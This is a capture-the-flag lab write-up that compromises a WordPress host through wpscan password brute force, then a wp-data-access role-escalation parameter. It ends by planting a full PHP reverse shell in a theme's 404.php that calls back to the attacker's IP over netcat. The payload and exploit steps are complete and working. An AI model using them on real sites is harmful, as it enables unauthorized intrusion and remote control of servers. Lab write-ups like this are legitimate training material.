# Title : Breakme

- intro : We think our system is secure, hack it and prove us wrong.

```bash

#scan result 

$ nmap -sC -sV 10.10.84.118
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 14:50 WAT
Nmap scan report for 10.10.84.118
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.37 seconds
                                                        
```   

```bash

# directory burte force result

 feroxbuster -u http://10.10.84.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.84.118
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10355c http://10.10.84.118/icons/openlogo-75.png
200      GET      368l      933w    10701c http://10.10.84.118/
301      GET        9l       28w      313c http://10.10.84.118/manual => http://10.10.84.118/manual/
301      GET        9l       28w      320c http://10.10.84.118/manual/images => http://10.10.84.118/manual/images/
301      GET        9l       28w      316c http://10.10.84.118/manual/en => http://10.10.84.118/manual/en/
200      GET       10l       34w     2420c http://10.10.84.118/manual/images/mod_rewrite_fig2.png
200      GET        1l        6w       84c http://10.10.84.118/manual/images/up.gif
200      GET       15l       63w     7395c http://10.10.84.118/manual/images/ssl_intro_fig3.gif
200      GET       11l       49w     4550c http://10.10.84.118/manual/images/filter_arch.tr.png
200      GET        3l       12w     1204c http://10.10.84.118/manual/images/mod_filter_old.png
301      GET        9l       28w      316c http://10.10.84.118/wordpress => http://10.10.84.118/wordpress/
200      GET       55l      246w    21064c http://10.10.84.118/manual/images/reverse-proxy-arch.png
200      GET        1l        5w       84c http://10.10.84.118/manual/images/down.gif
200      GET        9l       44w     5193c http://10.10.84.118/manual/images/ssl_intro_fig2.gif
301      GET        9l       28w      316c http://10.10.84.118/manual/de => http://10.10.84.118/manual/de/
301      GET        9l       28w      316c http://10.10.84.118/manual/fr => http://10.10.84.118/manual/fr/
200      GET       63l      412w    38324c http://10.10.84.118/manual/images/feather.png
200      GET       77l      325w    24698c http://10.10.84.118/manual/images/caching_fig1.png
200      GET      119l      848w    66818c http://10.10.84.118/manual/images/rewrite_backreferences.png
200      GET      232l     1134w    97231c http://10.10.84.118/manual/images/syntax_rewriterule.png
200      GET        6l       29w     2168c http://10.10.84.118/manual/images/ssl_intro_fig2.png
200      GET        8l       29w     2343c http://10.10.84.118/manual/images/mod_filter_new.tr.png
200      GET        3l       37w     2249c http://10.10.84.118/manual/images/mod_filter_old.gif
200      GET       12l       56w     4382c http://10.10.84.118/manual/images/mod_filter_new.gif
200      GET        6l       58w     2303c http://10.10.84.118/manual/images/home.gif
301      GET        9l       28w      316c http://10.10.84.118/manual/es => http://10.10.84.118/manual/es/
200      GET       68l      318w    10209c http://10.10.84.118/manual/images/sub.gif
200      GET        3l       26w     3083c http://10.10.84.118/manual/images/mod_rewrite_fig1.png
200      GET        1l        6w       86c http://10.10.84.118/manual/images/left.gif
200      GET        1l        7w     2908c http://10.10.84.118/manual/images/favicon.ico
200      GET       10l       66w     4328c http://10.10.84.118/manual/images/filter_arch.png
200      GET      158l     1179w    92140c http://10.10.84.118/manual/images/build_a_mod_3.png
200      GET       26l      111w    10616c http://10.10.84.118/manual/images/ssl_intro_fig1.gif
200      GET       23l      143w     7050c http://10.10.84.118/manual/images/apache_header.gif
200      GET      299l     1691w   134287c http://10.10.84.118/manual/images/build_a_mod_2.png
301      GET        9l       28w      316c http://10.10.84.118/manual/tr => http://10.10.84.118/manual/tr/
200      GET      482l     2045w   163055c http://10.10.84.118/manual/images/SupportApache-small.png
200      GET        8l       24w     1868c http://10.10.84.118/manual/images/mod_filter_new.png
200      GET       17l       63w     4627c http://10.10.84.118/manual/images/mod_rewrite_fig2.gif
200      GET       14l       54w     2412c http://10.10.84.118/manual/images/index.gif
200      GET       18l      118w     6536c http://10.10.84.118/manual/images/feather.gif
200      GET       25l       87w     6358c http://10.10.84.118/manual/images/mod_rewrite_fig1.gif
200      GET       25l       72w     4606c http://10.10.84.118/manual/images/ssl_intro_fig3.png
200      GET        1l        5w       87c http://10.10.84.118/manual/images/right.gif
200      GET       16l       74w     5983c http://10.10.84.118/manual/images/ssl_intro_fig1.png
200      GET       50l      355w    31098c http://10.10.84.118/manual/images/custom_errordocs.png
200      GET       70l      299w    21207c http://10.10.84.118/manual/images/caching_fig1.tr.png
200      GET      105l      493w    29291c http://10.10.84.118/manual/images/caching_fig1.gif
200      GET      144l      873w    71685c http://10.10.84.118/manual/images/rewrite_rule_flow.png
200      GET      146l      919w    71900c http://10.10.84.118/manual/images/build_a_mod_4.png
301      GET        9l       28w      321c http://10.10.84.118/manual/es/misc => http://10.10.84.118/manual/es/misc/
301      GET        9l       28w      321c http://10.10.84.118/manual/fr/misc => http://10.10.84.118/manual/fr/misc/
200      GET      931l     5534w   463351c http://10.10.84.118/manual/images/bal-man.png
301      GET        9l       28w      321c http://10.10.84.118/manual/tr/misc => http://10.10.84.118/manual/tr/misc/
200      GET      408l     2298w   192916c http://10.10.84.118/manual/images/rewrite_process_uri.png
301      GET        9l       28w      325c http://10.10.84.118/manual/fr/programs => http://10.10.84.118/manual/fr/programs/
301      GET        9l       28w      325c http://10.10.84.118/manual/es/programs => http://10.10.84.118/manual/es/programs/
200      GET     1048l     6218w   583812c http://10.10.84.118/manual/images/bal-man-b.png
200      GET     1227l     7821w   677704c http://10.10.84.118/manual/images/bal-man-w.png
301      GET        9l       28w      319c http://10.10.84.118/manual/style => http://10.10.84.118/manual/style/
301      GET        9l       28w      320c http://10.10.84.118/manual/en/faq => http://10.10.84.118/manual/en/faq/
301      GET        9l       28w      322c http://10.10.84.118/manual/es/howto => http://10.10.84.118/manual/es/howto/
200      GET       42l      190w     1425c http://10.10.84.118/manual/style/sitemap.dtd
301      GET        9l       28w      321c http://10.10.84.118/manual/en/misc => http://10.10.84.118/manual/en/misc/
301      GET        9l       28w      321c http://10.10.84.118/manual/de/misc => http://10.10.84.118/manual/de/misc/
301      GET        9l       28w      322c http://10.10.84.118/manual/fr/howto => http://10.10.84.118/manual/fr/howto/
301      GET        9l       28w      327c http://10.10.84.118/wordpress/wp-content => http://10.10.84.118/wordpress/wp-content/
301      GET        9l       28w      320c http://10.10.84.118/manual/fr/faq => http://10.10.84.118/manual/fr/faq/
301      GET        9l       28w      316c http://10.10.84.118/manual/ja => http://10.10.84.118/manual/ja/
301      GET        9l       28w      326c http://10.10.84.118/manual/es/developer => http://10.10.84.118/manual/es/developer/
301      GET        9l       28w      325c http://10.10.84.118/manual/tr/programs => http://10.10.84.118/manual/tr/programs/
301      GET        9l       28w      322c http://10.10.84.118/manual/en/howto => http://10.10.84.118/manual/en/howto/
301      GET        9l       28w      326c http://10.10.84.118/manual/fr/developer => http://10.10.84.118/manual/fr/developer/
301      GET        9l       28w      325c http://10.10.84.118/manual/en/programs => http://10.10.84.118/manual/en/programs/
301      GET        9l       28w      325c http://10.10.84.118/manual/de/programs => http://10.10.84.118/manual/de/programs/
301      GET        9l       28w      334c http://10.10.84.118/wordpress/wp-content/themes => http://10.10.84.118/wordpress/wp-content/themes/
301      GET        9l       28w      322c http://10.10.84.118/manual/de/howto => http://10.10.84.118/manual/de/howto/
301      GET        9l       28w      326c http://10.10.84.118/manual/en/developer => http://10.10.84.118/manual/en/developer/
301      GET        9l       28w      320c http://10.10.84.118/manual/ja/faq => http://10.10.84.118/manual/ja/faq/
301      GET        9l       28w      325c http://10.10.84.118/manual/ja/programs => http://10.10.84.118/manual/ja/programs/
301      GET        9l       28w      335c http://10.10.84.118/wordpress/wp-content/plugins => http://10.10.84.118/wordpress/wp-content/plugins/
301      GET        9l       28w      326c http://10.10.84.118/manual/de/developer => http://10.10.84.118/manual/de/developer/
301      GET        9l       28w      322c http://10.10.84.118/manual/ja/howto => http://10.10.84.118/manual/ja/howto/
301      GET        9l       28w      316c http://10.10.84.118/manual/da => http://10.10.84.118/manual/da/
301      GET        9l       28w      320c http://10.10.84.118/manual/es/ssl => http://10.10.84.118/manual/es/ssl/
404      GET        0l        0w      274c http://10.10.84.118/manual/tr/misc/America
[#>------------------] - 6m    698539/8160396 2h      found:85      errors:646166 
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_84_118-1751291964.state ...
[#>------------------] - 6m    698539/8160396 2h      found:85      errors:646166 
[##>-----------------] - 6m     23627/220546  63/s    http://10.10.84.118/ 
[##>-----------------] - 6m     23299/220546  63/s    http://10.10.84.118/manual/ 
[####################] - 8s    220546/220546  28188/s http://10.10.84.118/manual/images/ => Directory listing (add --scan-dir-listings to scan)
[#>------------------] - 6m     19631/220546  53/s    http://10.10.84.118/manual/en/ 
[##>-----------------] - 6m     22448/220546  61/s    http://10.10.84.118/manual/de/ 
[#>------------------] - 6m     21717/220546  59/s    http://10.10.84.118/manual/fr/ 
[##>-----------------] - 6m     23147/220546  63/s    http://10.10.84.118/wordpress/ 
[#>------------------] - 6m     21861/220546  60/s    http://10.10.84.118/manual/es/ 
[##>-----------------] - 6m     22114/220546  60/s    http://10.10.84.118/manual/tr/ 
[#>------------------] - 6m     19934/220546  55/s    http://10.10.84.118/manual/fr/faq/ 
[#>------------------] - 6m     19979/220546  55/s    http://10.10.84.118/manual/es/misc/ 
[#>------------------] - 6m     20145/220546  55/s    http://10.10.84.118/manual/fr/misc/ 
[#>------------------] - 6m     20249/220546  56/s    http://10.10.84.118/manual/tr/misc/ 
[#>------------------] - 6m     20561/220546  57/s    http://10.10.84.118/manual/fr/programs/ 
[#>------------------] - 6m     21110/220546  58/s    http://10.10.84.118/manual/es/programs/ 
[####################] - 7s    220546/220546  30521/s http://10.10.84.118/manual/style/ => Directory listing (add --scan-dir-listings to scan)



```


- Now, scanning with wpscan:

```bash

 

```

- No password was found.

- Next, I tried enumerating users,plugins,templates with wpscan

```bash

wpscan --url http://breakme.thm/wordpress/ -e u,p,t

```

- It found 2 users and 1 plugin:

```bash

 wpscan --url http://breakme.thm/wordpress/ -e u,p,t
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.


Scan Aborted: Canceled by User
                                                                                                                      
┌──(graceman㉿RG)-[~]
└─$ wpscan --url http://breakme.thm/wordpress/ -e u,p,t
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://breakme.thm/wordpress/ [10.10.84.118]
[+] Started: Mon Jun 30 15:44:57 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://breakme.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://breakme.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://breakme.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-06-19T00:02:00.000Z
 | [!] The version is out of date, the latest version is 5.5.43
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:20 <======================================> (400 / 400) 100.00% Time: 00:00:20
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/, status: 403
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] twentytwentyone
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 2.1'

[+] twentytwentythree
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentythree/, status: 403
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.3'

[+] twentytwentytwo
 | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.6'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <========================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://breakme.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 30 15:45:45 2025
[+] Requests Done: 468
[+] Cached Requests: 19
[+] Data Sent: 128.912 KB
[+] Data Received: 646.412 KB
[+] Memory used: 273.492 MB
[+] Elapsed time: 00:00:47



```

- Let’s try to crack bob’s password using wpscan

```bash

 wpscan --url http://breakme.thm/wordpress/wp-login.php -U bob -P /usr/share/wordlists/rockyou.txt

```

- # Result

```bash

$ wpscan --url http://breakme.thm/wordpress/wp-login.php -U bob -P /usr/share/wordlists/rockyou.txt

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://breakme.thm/wordpress/wp-login.php/ [10.10.84.118]
[+] Started: Mon Jun 30 15:44:52 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://breakme.thm/wordpress/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://breakme.thm/wordpress/wp-includes/css/dashicons.min.css?ver=6.4.3
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://breakme.thm/wordpress/wp-includes/css/buttons.min.css?ver=6.4.3
 |   - http://breakme.thm/wordpress/wp-includes/js/wp-util.min.js?ver=6.4.3
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://breakme.thm/wordpress/wp-includes/css/dashicons.min.css?ver=6.4.3
 |   - http://breakme.thm/wordpress/wp-includes/css/buttons.min.css?ver=6.4.3
 |   - http://breakme.thm/wordpress/wp-admin/css/forms.min.css?ver=6.4.3
 |   - http://breakme.thm/wordpress/wp-admin/css/l10n.min.css?ver=6.4.3

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:36 <=======================================================> (137 / 137) 100.00% Time: 00:00:36

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - bob / soccer                                                                                                              
Trying bob / anthony Time: 00:00:03 <                                                          > (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bob, Password: soccer

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 30 15:45:59 2025
[+] Requests Done: 349
[+] Cached Requests: 4
[+] Data Sent: 104.474 KB
[+] Data Received: 1.138 MB
[+] Memory used: 275.926 MB
[+] Elapsed time: 00:01:06


```

- user bob, Password: soccer

- after i login that not valid they, i then make research on the plugin  which i find out it was vulnerable 

```bash

#version of the plugin was

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-06-19T00:02:00.000Z
 | [!] The version is out of date, the latest version is 5.5.43
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | # Version: 5.3.5` (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:20 <======================================> (400 / 400) 100.00% Time: 00:00:20
[+] Checking Theme Versions (via Passive and Aggressive Methods)


```

- it allow one to gain Admin privileges by simply modifying the update profile request and add the following param at the end.

- after sending the request to repeater on burpsuite i add `&wpda_role[]=administrator` and sent it and i the priveledge was and admin

- And now we are Admins!
- but this is just goal let get an rce

- Going and editing the 404.php file content. I received a reverse shell.

   ```http://breakme.thm/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone```

- pasta my payload

```bash

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.11.108.75';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

```
- use netcat to catch the rce

```

nc -lvnp 9001

```

- After updating the file, visit the following URL and make sure you have an open listener:

```bash

http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/404.php

```

- and the listener catch the shell

```bash

$ nc -lvnp 9001            
listening on [any] 9001 ...
connect to [10.11.108.75] from (UNKNOWN) [10.10.84.118] 52292
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
 11:23:03 up  1:33,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 


```

- Make the terminal stable with:

```bash 
python3 -c "import pty;pty.spawn('/bin/bash')"

export TERM=xterm

```

- 

```bash

www-data@Breakme:/$ cd home
cd home
www-data@Breakme:/home$ ls
ls
john  lost+found  youcef
www-data@Breakme:/home$ cd john
cd john
www-data@Breakme:/home/john$ ls
ls
internal  user1.txt
www-data@Breakme:/home/john$ cat user1.txt  
cat user1.txt
cat: user1.txt: Permission denied
www-data@Breakme:/home/john$ 


```

- we have gotten the permission to read the file 
- escalate our privilege
